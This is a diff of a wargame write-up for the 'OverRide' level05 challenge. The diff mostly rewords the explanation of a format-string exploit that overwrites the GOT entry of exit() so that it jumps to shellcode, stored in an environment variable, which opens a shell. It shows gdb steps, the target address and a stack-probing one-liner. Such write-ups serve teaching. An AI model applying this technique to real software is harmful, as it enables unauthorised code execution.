@@ -41,7 +41,9 @@ level05@OverRide:~$ dmesg | grep "Execute Disable"
 [    0.000000] NX (Execute Disable) protection: active
 ```
 
-Instead, we will use a shellcode stored in an environmental variable to run a string format attack to overwrite ```exit()```. 
+Instead, we will:
+- use a shellcode stored in an environmental variable 
+- to run a string format attack to overwrite ```exit()``` 
 
 We will use [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php).
 ```
@@ -83,9 +85,7 @@ Note: reverse order for little endian!
 0xffff -> 65535
 ```
 
-We are going to use our format string attack to overwrite the call to ```exit()```. 
-
-The GOT address of ```exit()``` is ```0x080497e0```.
+Next, find the address of ```exit()```. The GOT address of ```exit()``` is ```0x080497e0```.
 ```
 level05@OverRide:~$ gdb -q level05
 (gdb) info function exit
@@ -97,7 +97,8 @@ level05@OverRide:~$ gdb -q level05
 ```
 We will also have to split the address of ```exit()``` in two, to accomodate our hefty 2-part shellcode address. 
 
-Finally, let's check our buffer position for the printf() string format exploit.
+Finally, let's check our buffer position for the ```printf()``` string format exploit.
+
 We can see our buffer "AAAA" in the 10th position on the stack as 61616161.
 ```
 level05@OverRide:~$ python -c 'print "AAAA"+" %x"*12' | ./level05
